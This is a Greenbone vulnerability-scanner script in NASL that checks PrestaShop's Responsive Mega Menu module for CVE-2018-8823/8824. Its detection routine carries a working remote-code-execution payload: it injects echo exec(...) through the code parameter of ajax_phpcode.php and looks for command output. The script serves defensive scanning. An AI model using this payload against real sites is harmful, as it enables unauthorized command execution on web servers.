# Copyright (C) 2020 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:prestashop:prestashop";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.144185");
  script_version("2020-06-30T09:37:28+0000");
  script_tag(name:"last_modification", value:"2020-07-02 10:22:40 +0000 (Thu, 02 Jul 2020)");
  script_tag(name:"creation_date", value:"2020-06-30 09:08:47 +0000 (Tue, 30 Jun 2020)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2018-8823", "CVE-2018-8824");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"Mitigation");

  script_name("PrestaShop Responsive Mega Menu Module RCE / SQL Injection Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2020 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_prestashop_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("prestashop/detected");

  script_tag(name:"summary", value:"The 'Responsive Mega Menu' module for PrestaShop is prone to a remote code
  execution and SQL injection vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"modules/bamegamenu/ajax_phpcode.php in the Responsive Mega Menu
  (Horizontal+Vertical+Dropdown) Pro module 1.0.32 for PrestaShop allows remote attackers to execute an SQL
  injection or remote code execution through function calls in the code parameter.");

  script_tag(name:"affected", value:"Responsive Mega Menu (Horizontal+Vertical+Dropdown) Pro module 1.0.32 for
  PrestaShop 1.5.5.0 through 1.7.2.5.");

  script_tag(name:"solution", value:"Disable function exec(), passthru(), shell_exec(), system(), delete or edit
  the vulnerable file.");

  script_xref(name:"URL", value:"https://ia-informatica.com/it/CVE-2018-8824");
  script_xref(name:"URL", value:"https://ia-informatica.com/it/CVE-2018-8823");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

cmds = exploit_commands();

foreach pattern (keys(cmds)) {
  cmd = cmds[pattern];
  url = dir + "/modules/bamegamenu/ajax_phpcode.php?code=echo%20exec%28" + cmd + "%29%3B";

  req = http_get(port: port, item: url);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (egrep(pattern: pattern, string: res)) {
    report = 'It was possible to execute the "' + cmd + '" command.\n\nResult:\n\n' + res;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0);
